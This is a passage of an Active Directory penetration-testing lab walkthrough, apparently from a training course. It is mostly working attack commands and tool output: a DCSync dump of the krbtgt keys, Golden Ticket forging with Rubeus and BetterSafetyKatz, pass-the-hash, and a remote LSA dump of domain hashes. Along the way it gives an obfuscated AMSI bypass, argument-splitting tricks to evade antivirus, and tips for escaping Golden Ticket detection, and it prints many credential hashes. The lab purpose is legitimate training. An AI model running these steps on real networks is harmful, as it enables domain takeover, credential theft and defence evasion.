+<img src="./images/screenshot_64.png" alt="">
+
+
+<pre><code>mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
+[DC] 'dollarcorp.moneycorp.local' will be the domain
+[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
+[DC] 'dcorp\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 10:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
+      des_cbc_md5       (4096) : 150ea2e934ab6b80
+
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 150ea2e934ab6b80
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  a0e60e247b498de4cacfac3ba615af01
+    02  86615bb9bf7e3c731ba1cb47aa89cf6d
+    03  637dfb61467fdb4f176fe844fd260bac
+    04  a0e60e247b498de4cacfac3ba615af01
+    05  86615bb9bf7e3c731ba1cb47aa89cf6d
+    06  d2874f937df1fd2b05f528c6e715ac7a
+    07  a0e60e247b498de4cacfac3ba615af01
+    08  e8ddc0d55ac23e847837791743b89d22
+    09  e8ddc0d55ac23e847837791743b89d22
+    10  5c324b8ab38cfca7542d5befb9849fd9
+    11  f84dfb60f743b1368ea571504e34863a
+    12  e8ddc0d55ac23e847837791743b89d22
+    13  2281b35faded13ae4d78e33a1ef26933
+    14  f84dfb60f743b1368ea571504e34863a
+    15  d9ef5ed74ef473e89a570a10a706813e
+    16  d9ef5ed74ef473e89a570a10a706813e
+    17  87c75daa20ad259a6f783d61602086aa
+    18  f0016c07fcff7d479633e8998c75bcf7
+    19  7c4e5eb0d5d517f945cf22d74fec380e
+    20  cb97816ac064a567fe37e8e8c863f2a7
+    21  5adaa49a00f2803658c71f617031b385
+    22  5adaa49a00f2803658c71f617031b385
+    23  6d86f0be7751c8607e4b47912115bef2
+    24  caa61bbf6b9c871af646935febf86b95
+    25  caa61bbf6b9c871af646935febf86b95
+    26  5d8e8f8f63b3bb6dd48db5d0352c194c
+    27  3e139d350a9063db51226cfab9e42aa1
+    28  d745c0538c8fd103d71229b017a987ce
+    29  40b43724fa76e22b0d610d656fb49ddd
+
+
+mimikatz(commandline) # exit
+Bye!</code></pre>
+
+
+<p>We got the information needed for KRBTGT account above. Most important information are in red color on output.</p>
+<p>Let’s now use Rubeus command to generate an OPSEC friendly command for Golden ticket. Note that 3 LDAP queries are sent to the DC to retrieve the required information. We will once again use ArgsSplit.bat to encode "golden":</p>
+<pre><code>set "z=n"
+set "y=e"
+set "x=d"
+set "w=l"
+set "v=o"
+set "u=g"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>After that we can simply execute our Rubeus.exe payload using all the information.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd</p>
+<pre><code>C:\AD\Tools&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+[*] Applying amsi patch: true
+[*] Applying etw patch: true
+[*] Decrypting packed exe...
+[!] ~Flangvik - Arno0x0x Edition - #NetLoader
+[+] Patched!
+[+] Starting C:\AD\Tools\Rubeus.exe with args 'golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd'
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Build TGT
+
+[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
+[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Building PAC
+
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 544,512,520,513
+[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : krbtgt
+[*] Target         : dollarcorp.moneycorp.local
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'
+
+[*] AuthTime       : 6/1/2024 7:43:48 PM
+[*] StartTime      : 6/1/2024 7:43:48 PM
+[*] EndTime        : 6/2/2024 5:43:48 AM
+[*] RenewTill      : 6/8/2024 7:43:48 PM
+
+[*] base64(ticket.kirbi):
+
+      doIGJDCCBiCgAwIBBaEDAgEWooIE3jCCBNphggTWMIIE0qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
+      BHowggR2oAMCARKhAwIBA6KCBGgEggRkSDu/Skuemv4GzQGqy67JjvjvZVMPveRBIl4ecVXDZmR0G+/B
+      we6dU3UAeRlIM59vZY/KpwGX3+WukJIjso09iq4SALE720c9rc1v93BQb7l5Zqo2+8HrBFSeJCoCBwpq
+      +j3gnZOee9eqDFxv8l4HWMuzpVW2UQl+Up6S3WHqQAOea/n33H+Ch+zmstBntzgUbbiweonYW7tUvQwA
+      wGJltuoE8IbTak+2MYn6TNvhU2/hvRXwtXsKi7nVjuj8p98elo1Mmrq/l0dw0WXcSzGSOBw5fORVu3+U
+      3IFra/Uo1a94zh5TzRS2YmVp8OYq94EkizzG/etgcDWLyny1x7TzvSJwDmRRKvwTSXnj1Dlmk7TWCbx6
+      OMzCa6NjLn0D9TQ0cz0ITvVIN7Tli3SJnj7UF3YTwOIlRmh+l8SjCLNgRVOg65T0M6H1WNbCLdJd/eOZ
+      kqxIc4plDoSMdhMaiIjp+xwzCL6w1ce2txLI3jy1GNm3HmjumXJoJE6UJX8nbWJswP7XraQlyv4wQ5lu
+      KoX7Bec2XIHCRdhfM6+pbNsJR6WH9NwFYh1MwZ+ZemjbKh+z8zsRKKmuTp5guZbkPWuRGSc9KUJeyLDT
+      y21Zo4KuvYq6XFNm4x2XZm8++AQnGFNjqXDDCyqLtAEwaDqtblOxDRr/u8Azwn58nIDj4g3RMXgDCuwx
+      BPKksayH8TkpkVaCfP7w0Pe0Kka0bqi3RhftXFk6P8SRvRlR1Fe1KEp7ovRtC2WsloLVYn0jEZgJrk+9
+      YRlRCf6Vs3783+aZrP/N2hNbBSkF4BXOsN4hGDsygvSQIeht/srUDuXNfyIgiF5Fg7m/ZofbR3PrSQ7V
+      sUR3nj0rFjXMPJqsWNWFcP/NMLzuU7BrrlO3XC2SaSd1UpGCnbgZ5mTlKporH2RFtE5bJkw5uI5ELT+4
+      FF0xa6lz4YasMiFt3dNIcTQMsNE/z+ID+g2EgK6hSYIIP60Cz9ukg0/xDoK3WJakNV15AruAh+GeLWtk
+      ef+BYENgSpVxvQihcRUOyBooWfJXDctYlwvPBrDjB8j63CdLUX+wz38XToRxHLwCljLRcUTQGD3x1IlC
+      GJ21HfUfCS9nQoxhpjrqrLUvI9WhhRJy/Vgx2YueE2DjJZHs7rpmZW9zZ0VK4X0r4MqM+d1pJQq8G9OK
+      BEPR1VVyFNXQQqh3A/5uhWXvzhXexmsEeFGRTCa5q8DQkfamJSZSKY8DU40HtKW9EsVNYyzLUfemd+aQ
+      Ydf1Uxbh+Lodr6Sl1bAV2LDbsIx0mKmlLnvKQb+cwU6Gc8Exm0/gQ3R9a58qGzpsPjRPYD11wbgiSh2J
+      D4vhKCgD4eW9iJtMSP1UUoIZ3SDFgWYFOfRZA1cJXJinfV57DzYRrlBZkzA7oaa5/+/vJYSkau/f5TGL
+      yiqeM0xToXKM3v+MsSb9FblQDR1C4LyDz6AQTQ92g2ggW/avX9PEtgNqpJeU70/KtvW3cULg5k8VeX1X
+      z5tRvmgwA2OjggEwMIIBLKADAgEAooIBIwSCAR99ggEbMIIBF6CCARMwggEPMIIBC6ArMCmgAwIBEqEi
+      BCB26BGUo5JCelxiRKcSoG+Z+AStCIDYmpGX57IuC6wBzqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5M
+      T0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyNDA2MDIwMjQzNDha
+      pREYDzIwMjQwNjAyMDI0MzQ4WqYRGA8yMDI0MDYwMjEyNDM0OFqnERgPMjAyNDA2MDkwMjQzNDhaqBwb
+      GkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3Jw
+      Lm1vbmV5Y29ycC5sb2NhbA==
+
+
+
+[*] Printing a command to recreate a ticket containing the information used within this ticket
+
+C:\AD\Tools\Loader.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:4629 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD</code></pre>
+
+
+<p>We can see above output that  it worked fine and It was able to generate the command I highlighted in RED.</p>
+<p>Let’s now use the just generate command above to forge a Golden ticket. Remember to add /ptt at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain.</p>
+<p>Note that we will once again use Loader.exe and ArgsSplit.bat to encode "golden" .</p>
+<p>Please pay attention that the command generated doesn’t include Rubeus.exe, so we need to add it and its -args flag as well.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:4629 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt</p>
+<img src="./images/screenshot_65.png" alt="">
+
+
+<p>That’s great we were able to generate a forged Golden Ticket and inject  it into the current process. we can now access resources in the domain.</p>
+<p>We do have injected the Golden Ticket into the process to let’s try to access the Domain Controller using WinRS and check what user are we now.</p>
+<p>winrs -r:dcorp-dc cmd</p>
+<img src="./images/screenshot_66.png" alt="">
+
+
+<p>Voila. Above we can see that we are Administrator Account.</p>
+
+
+<h1>Golden Ticket using BetterSafetyKatz.exe</h1>
+
+
+<p>BetterSafetyKatz.exe is an enhanced fork of SafetyKatz that adds dynamic fetching of Mimikatz, runtime patching for evasion, and in-memory loading to perform similar credential extraction and manipulation tasks as SafetyKatz, but with improved stealth and evasion capabilities.</p>
+<p>The main differences between BetterSafetyKatz.exe and SafetyKatz.exe are:</p>
+<p>1. Dynamic Fetching:BetterSafetyKatz.exe dynamically fetches the latest pre-compiled release of Mimikatz directly from the gentilkiwi GitHub repository, whileSafetyKatz does not have this functionality</p>
+<li>Runtime Patching:BetterSafetyKatz.exe performs runtime patching on detected signatures to evade detection by Windows Defender. SafetyKatz does not have thisruntime patching capability</li>
+<li>In-Memory Loading:BetterSafetyKatz.exe uses SharpSploit 1.6 DInvoke to load Mimikatz intomemory, bypassing API hooking. The original SafetyKatz does not havethis in-memory loading technique</li>
+<li>Functionality: Bothtools are used for credential extraction and manipulation, includingtasks like dumping hashes and creating Golden Tickets in ActiveDirectory environments. However, BetterSafetyKatz.exe has additionalfeatures like dynamic fetching and runtime patching</li>
+<li>Evasion:BetterSafetyKatz.exe is designed to evade detection by Windows Defenderthrough runtime patching of signatures. SafetyKatz does not have this evasion capability</li>
+
+<p>For this, we need to run a process as Domain Admin privilege. I already have all information needed to get a process as SVCADMIN since the account is a Domain Admin account.</p>
+<p>I’m using the command below just to get a cmd process as Domain Admin Privileges.</p>
+<p>Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</p>
+<p>The command above is the normal way we issue it to the command line in case are not worried about any AV  or also writting the Disk.</p>
+
+<p>Now in case we are avoiding AV and also want to execute the payloads from the memory, we don’t want to touch the disk at all, we need to use ArgSplit.bat.</p>
+<p>It is a tool used to encode parameters for various security tools like Rubeus.exe, SafetyKatz, and BetterSafetyKatz. It simplifies the process of specifying parameters, maintains consistency, and can be used to evade detection.</p>
+<p>The example below is the encoded for “asktgt”</p>
+<pre><code>set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>C:\AD\Tools\Loader.exe -path Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</p>
+<img src="./images/screenshot_67.png" alt="">
+
+
+<p>Once executed, a new process starts and this time as Domain Admin, in this case the new process is running as SVCADMIN user.</p>
+
+
+<h3>Bypassing common detection</h3>
+
+
+<p>The most frequent ways to detect a golden ticket are by inspecting Kerberos traffic on the wire. By default, Mimikatz signs the TGT for 10 years, which will stand out as anomalous in subsequent TGS requests made with it.</p>
+<p>Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM</p>
+<p>Use the /startoffset, /endin and /renewmax parameters to control the start offset, duration and the maximum renewals (all in minutes).</p>
+<p>Get-DomainPolicy | select -expand KerberosPolicy</p>
+<p>Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs. However, what you can correlate is seeing 4769's without a prior 4768. </p>
+<p>It's not possible to request a TGS without a TGT, and if there is no record of a TGT being issued, we can infer that it was forged offline.</p>
+
+<p>So Let’s try this detection bypass using BetterSafetyKatz.exe using the kerberos::golden payload.</p>
+
+<pre><code>set "z=n"
+set "y=e"
+set "x=d"
+set "w=l"
+set "v=o"
+set "u=g"
+set "t=:"
+set "s=:"
+set "r=s"
+set "q=o"
+set "p=r"
+set "o=e"
+set "n=b"
+set "m=r"
+set "l=e"
+set "k=k"
+set "Pwn=%k%%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>Then we can execute the following command if we are using Loader.exe.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\BetterSafetyKatz.exe -args "%Pwn% /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /eas256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit”</p>
+
+<p>If we are not using Loader.exe we can simply run.</p>
+<p>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:sid:S-1-5-21-719815819-3726368948-3917688648 /eas256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit”</p>
+
+<p>This way we are able to request a new ticket as Administrator and we can see the tickets we have in memory with the command klist.</p>
+<p>We can now check any target in the domain including the Domain Controller.</p>
+<p>dir \\dcorp-dc\c$</p>
+
+
+<h1>Using PowerShell Remoting and Invoke-Mimi.ps1</h1>
+
+
+<p>We will do a Golden Ticket attack via Powershell as well.</p>
+<p>While using PowerShell, we can escalate our privilege to Domain Admin if we detain user’s NTLM hash or AES256 Key  using Invoke-Mimi.ps1.</p>
+<h3>Domain Admin process using NTLM Hash</h3>
+
+
+<p> . .\Invoke-Mimi.ps1</p>
+<p>Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'</p>
+<img src="./images/screenshot_68.png" alt="">
+
+
+
+<h3>Domain Admin process using AES256</h3>
+
+
+<p>. .\Invoke-Mimi.ps1</p>
+<p>Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe"’</p>
+<img src="./images/screenshot_69.png" alt="">
+
+
+<p>OK now that we do have a valid Domain Admin process, let’s carry on.</p>
+
+<p>Let’s now run InvisiShell to bypass AV and others security blocks.</p>
+<p>c:\AD\Tools\InviShell>RunWithRegistryNonAdmin.bat</p>
+<img src="./images/screenshot_70.png" alt="">
+
+
+
+<p>Now let’s access the Domain Controller using PowerShell Remoting.</p>
+<p>$session = New-PSSession -ComputerName dcorp-dc </p>
+<p>Enter-PSsession $session</p>
+<img src="./images/screenshot_71.png" alt="">
+
+
+<p>We can see now that we have a session inside Domain Controller.</p>
+<p>Inside the new session let’s also run the AMSI bypass:</p>
+<pre><code>S`eT-It`em ( 'V'+'aR' + 'IA' +(('b'+("{1}{0}"-f':1','lE'))+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;(Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em') ))."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile')) ),( "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )</code></pre>
+
+
+
+<p>Now let me explain what will happen next… first we runs Invoke-Mimi.ps1 on the  remote system using Invoke-Command. </p>
+<p>Then, we start an interactive PowerShell session on the target using Enter-PSSession. </p>
+<p>Finally, we can executes a specific commands related to Mimikatz on the remote system using the Invoke-Mimi function or cmdlet and for this attack we will simply ask to dump LSA in Domain Controller dumpling all NTLM hashes.</p>
+<p>Invoke-Command -FilePath .\Invoke-Mimi.ps1 -Session $sess</p>
+<p>Enter-PSSession $sess</p>
+<p>Invoke-Mimi -Command '"lsadump::lsa /patch"'</p>
+<pre><code>
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : af0686cc0ca8f04df42210c9ac980760
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 4e9815869d2090ccfca61c1fe0d23986
+
+RID  : 00000459 (1113)
+User : sqladmin
+LM   :
+NTLM : 07e8be316e3da9a042a9cb681df19bf5
+
+RID  : 0000045a (1114)
+User : websvc
+LM   :
+NTLM : cc098f204c5887eaa8253e7c2749156f
+
+RID  : 0000045b (1115)
+User : srvadmin
+LM   :
+NTLM : a98e18228819e8eec3dfa33cb68b0728
+
+RID  : 0000045d (1117)
+User : appadmin
+LM   :
+NTLM : d549831a955fee51a43c83efb3928fa7
+
+RID  : 0000045e (1118)
+User : svcadmin
+LM   :
+NTLM : b38ff50264b74508085d82c69794a4d8
+
+RID  : 0000045f (1119)
+User : testda
+LM   :
+NTLM : a16452f790729fa34e8f3a08f234a82c
+
+RID  : 00000460 (1120)
+User : mgmtadmin
+LM   :
+NTLM : 95e2cd7ff77379e34c6e46265e75d754
+
+RID  : 00000461 (1121)
+User : ciadmin
+LM   :
+NTLM : e08253add90dccf1a208523d02998c3d
+
+RID  : 00000462 (1122)
+User : sql1admin
+LM   :
+NTLM : e999ae4bd06932620a1e78d2112138c6
+
+RID  : 00001055 (4181)
+User : studentadmin
+LM   :
+NTLM : d1254f303421d3cdbdc4c73a5bce0201
+
+RID  : 00003521 (13601)
+User : student441
+LM   :
+NTLM : f35f143c13eee7ec6dbfe94c8976b740
+
+RID  : 00003522 (13602)
+User : student442
+LM   :
+NTLM : 953da8cbdab52254995f7652ab7d6e36
+
+RID  : 00003523 (13603)
+User : student443
+LM   :
+NTLM : 126769e11080d8193c17098c80d96f4a
+
+RID  : 00003524 (13604)
+User : student444
+LM   :
+NTLM : 4f37000dec520d9cb90095a92e6fdabe
+
+RID  : 00003525 (13605)
+User : student445
+LM   :
+NTLM : eec9112ec22e2fc4dc6e0ab5319b667c
+
+RID  : 00003526 (13606)
+User : student446
+LM   :
+NTLM : c2c421bb7b043cb57dadc5770f9f73d2
+
+RID  : 00003527 (13607)
+User : student447
+LM   :
+NTLM : 17a7fd1f569081a534f56b07cf70f1df
+
+RID  : 00003528 (13608)
+User : student448
+LM   :
+NTLM : d5f9e8672c6f64526c1099246a5565f4
+
+RID  : 00003529 (13609)
+User : student449
+LM   :
+NTLM : 6d37173e0de202f6630231dc06e5bb13
+
+RID  : 0000352a (13610)
+User : student450
+LM   :
+NTLM : c2ed42e66206f561d266c3846844fce9
+
+RID  : 0000352b (13611)
+User : student451
+LM   :
+NTLM : 4b11f749c331826c9f1197b617fb47a2
+
+RID  : 0000352c (13612)
+User : student452
+LM   :
+NTLM : 91b5329ca1d44b91502b5f0d93576495
+
+RID  : 0000352d (13613)
+User : student453
+LM   :
+NTLM : abac3975bdb8763dbe96600a2befb3ed
+
+RID  : 0000352e (13614)
+User : student454
+LM   :
+NTLM : 0dd4bf508e520534d215eb73b94094f1
+
+RID  : 0000352f (13615)
+User : student455
+LM   :
+NTLM : e213e2c54ac00bb713a54255cd9b16eb
+
+RID  : 00003530 (13616)
+User : student456
+LM   :
+NTLM : 205efd7b34d015a84c3638f549c7028f
+
+RID  : 00003531 (13617)
+User : student457
+LM   :
+NTLM : 01f47fdd2648ff34bf65365c612768ab
+
+RID  : 00003532 (13618)
+User : student458
+LM   :
+NTLM : 688fa7689cc985eee3b265d9f3fc0707
+
+RID  : 00003533 (13619)
+User : student459
+LM   :
+NTLM : c109389efb9c32b8f6fc21739e3dd51e
+
+RID  : 00003534 (13620)
+User : student460
+LM   :
+NTLM : 85fa1dedc18f503b603322d631cbda56
+
+RID  : 00003535 (13621)
+User : Control441user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003536 (13622)
+User : Control442user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003537 (13623)
+User : Control443user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003538 (13624)
+User : Control444user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003539 (13625)
+User : Control445user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353a (13626)
+User : Control446user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353b (13627)
+User : Control447user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353c (13628)
+User : Control448user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353d (13629)
+User : Control449user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353e (13630)
+User : Control450user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353f (13631)
+User : Control451user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003540 (13632)
+User : Control452user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003541 (13633)
+User : Control453user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003542 (13634)
+User : Control454user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003543 (13635)
+User : Control455user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003544 (13636)
+User : Control456user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003545 (13637)
+User : Control457user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003546 (13638)
+User : Control458user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003547 (13639)
+User : Control459user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003548 (13640)
+User : Control460user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003549 (13641)
+User : Support441user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354a (13642)
+User : Support442user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354b (13643)
+User : Support443user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354c (13644)
+User : Support444user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354d (13645)
+User : Support445user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354e (13646)
+User : Support446user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354f (13647)
+User : Support447user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003550 (13648)
+User : Support448user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003551 (13649)
+User : Support449user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003552 (13650)
+User : Support450user
+LM   :
